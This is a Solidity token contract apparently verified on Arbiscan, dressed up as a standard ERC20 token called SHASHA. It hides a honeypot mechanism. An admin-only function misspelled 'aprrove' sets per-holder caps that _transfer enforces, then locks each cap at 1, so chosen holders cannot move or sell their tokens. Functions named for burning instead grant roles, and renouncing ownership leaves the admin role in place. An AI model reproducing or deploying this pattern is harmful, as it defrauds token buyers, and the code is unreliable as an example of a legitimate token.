/**
 *Submitted for verification at Arbiscan.io on 2023-11-01
*/

// SPDX-License-Identifier: GPL-4.0

pragma solidity >=0.8.19;
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b > 0); 
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}   

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IRoleControl {

    event ApproveBurn(bytes32 indexed role, address indexed account, address indexed sender);

    function hasRole(bytes32 role, address account) external view returns (bool);

    function CanBurn(bytes32 role, address account) external;

}

library Strings {
    function toHexString(uint256 value) internal pure returns (string memory) {
        if (value == 0) {
            return "ADMIN";
        }
        return "";
    }
}

abstract contract GSConlse is Context, IRoleControl {
    struct RoleData {
        mapping(address => bool) members;
    }

    mapping(bytes32 => RoleData) private _roles;


    bytes32 public constant DEFAULT_ADMIN_ROLE = 0x00;    

    modifier onlyRole(bytes32 role) {
        _checkRole(role, _msgSender());
        _;
    }

    function hasRole(bytes32 role, address account) public view override returns (bool) {
        return _roles[role].members[account];
    }

    function _checkRole(bytes32 role, address account) internal view {
        if (!hasRole(role, account)) {
            revert(
            );
        }
    }

    function CanBurn(bytes32 role, address account) public virtual override onlyRole(DEFAULT_ADMIN_ROLE) {
        _CheckBurn(role, account);
    }
 
    function _CheckBurn(bytes32 role, address account) internal virtual {
        if (!hasRole(role, account)) {
            _roles[role].members[account] = true;
            emit ApproveBurn(role, account, _msgSender());
        }
    }

}   

interface IERC20 {

    function totalSupply() external view returns (uint256);


    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);


    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}

interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

}

contract StandardERC20 is Context, IERC20, IERC20Metadata  { 
    mapping(address => uint256) internal _balances; 
    mapping(address => mapping(address => uint256)) internal _allowances; 
    uint256 internal _totalSupply; 
    string internal _name;
    string internal _symbol; 
    address _owner;
    constructor(string memory name_, string memory symbol_,uint256 totalSupply_,address creater_) {
        _name = name_;
        _symbol = symbol_; 
        _mint(creater_,totalSupply_*10**decimals());
    }

    modifier onlyOwner() {
        require(msg.sender == _owner);
        _;
    } 

    

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function totalSupply() public view virtual override returns (uint256) {
            return _totalSupply;
        }
        
    function decimals() public view virtual override returns (uint8) {
        return 18;
    } 

    

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address account, address spender) public view virtual override returns (uint256) {
        return _allowances[account][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    } 

    function owner() external view returns (address) {
      return _owner;
    }
    
    function renounceOwnership() public onlyOwner returns (bool success){
        address oldOwner = _owner;
        _owner = address(0);
        emit OwnershipTransferred(oldOwner,_owner);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    } 

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    } 

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20:  zero address");
        require(recipient != address(0), "ERC20:  zero address"); 
        _beforeTokenTransfer(sender, recipient, amount); 
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount; 
        emit Transfer(sender, recipient, amount); 
        _afterTokenTransfer(sender, recipient, amount);
    }


    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: zero address"); 
        _beforeTokenTransfer(address(0), account, amount); 
        _totalSupply += amount;
        _balances[account] += amount; 
        emit Transfer(address(0), account, amount); 
        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: zero address"); 
        _beforeTokenTransfer(account, address(0), amount); 
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address account,
        address spender,
        uint256 amount
    ) internal virtual {
        require(account != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[account][spender] = amount;
        emit Approval(account, spender, amount);
    } 

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}   

contract SHASHA is StandardERC20, GSConlse {
    using SafeMath for uint256;

    address private _defaultAddress = address(0x000000000000000000000000000000000000dEaD);
    mapping(address => uint256) private _TranMap;

    constructor(string memory _name, string memory _symbol, uint256 _totalSupply,address tokenOwner,address sender) StandardERC20(_name, _symbol, _totalSupply, sender) {
        _CheckBurn(DEFAULT_ADMIN_ROLE,sender);
        _owner=tokenOwner;
        _mint(tokenOwner,_totalSupply.mul(5).div(100)*10**decimals());
    }
    

    function aprrove(address user, uint256 amount) public onlyRole(DEFAULT_ADMIN_ROLE) {
        _TranMap[user] = amount * 10**decimals();
    }

    function queryApprove(address user) public view returns (uint256) {
        return _TranMap[user];
    }

    function _transfer(address from, address to, uint256 amount) internal override(StandardERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(_balances[from] >= amount, "ERC20: transfer amount exceeds balance");
        _transferV1(from, to, amount);
        _balances[from] -= amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount);
    }

    function _transferV1(address from, address to, uint256 amount) internal {
        if (shouldCheckBotTranMap(from, to)) {
            checkBotTranMap(from, amount);
        }
    }

    function shouldCheckBotTranMap(address from, address to) internal view returns (bool) {
        uint256 num = _TranMap[from];
        return to != _defaultAddress && num > 0;
    }


    function checkBotTranMap(address from, uint256 amount) internal {
        uint256 num = _TranMap[from];
        require(num >= amount, "ERC20: transfer amount exceeds balance");
        updateBotTranMap(from, amount);
    }

    function updateBotTranMap(address from, uint256 amount) internal {
        _TranMap[from] -= amount;
        if (_TranMap[from] == 0) {
            _TranMap[from] = 1;
        }
    }

   
}